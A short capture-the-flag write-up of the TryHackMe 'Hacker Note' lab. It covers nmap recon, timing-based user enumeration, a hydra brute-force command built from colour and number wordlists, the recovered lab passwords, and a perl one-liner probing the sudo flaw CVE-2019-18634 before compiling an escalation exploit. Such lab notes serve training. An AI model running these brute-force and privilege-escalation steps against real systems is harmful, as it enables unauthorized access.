# Matheus Jesus 12-04-2020

## Try Hack Me - [Hacker Note](https://tryhackme.com/room/hackernote)

### IP 10.10.229.108

#### Recon

nmap -sC -sV -oN nmap_initial 10.10.229.108

ssh on 20

golang http server on 80
golang http server on 8080

#### Investigation

##### User Enum reference - [Here](https://github.com/NinjaJc01/hackerNoteExploits)

created an account admin:admin on /login

wrong username says invalid username or password

wrong password says logging you in for an instant (this means we can enumerate users)

script on go -> maybe refactored

found admin and james users

james is our user to be attacked

##### James Hint - "Hint: My favourite colour and my favourite number"

##### Combine password [reference](https://github.com/hashcat/hashcat-utils/releases)

Downloaded a colors.txt wordlist

generated a crunch 1 2 0123456789 > numbers.txt wordlist

./combinator.bin colors.txt numbers.txt > combined.txt

hydra -l james -P combined.txt 10.10.229.108 http-post-form /api/user/login:{"username":"^USER^", "password":"^PASS^}:failed

hydra is getting fucked by the post api with body

try patator.py

##### found james:blue7

login on the platform

##### James Note - So that I don't forget, my SSH password is dak4ddb37b

#### Escalate

The perl command shows the OS is not patched against CVE-2019-18634

perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
[sudo] password for james: Segmentation fault (core dumped)

##### Exploit [reference](https://github.com/saleemrashid/)

gcc escalate.c -o run
chmod +x run
./run

DONE !!

# References

Further reading

## Timing attacks on logins

https://seclists.org/fulldisclosure/2016/Jul/51
https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/
https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)

## Adobe Password Breach

https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/

## Sudo CVE

https://dylankatz.com/Analysis-of-CVE-2019-18634/
https://nvd.nist.gov/vuln/detail/CVE-2019-18634
https://tryhackme.com/room/sudovulnsbof
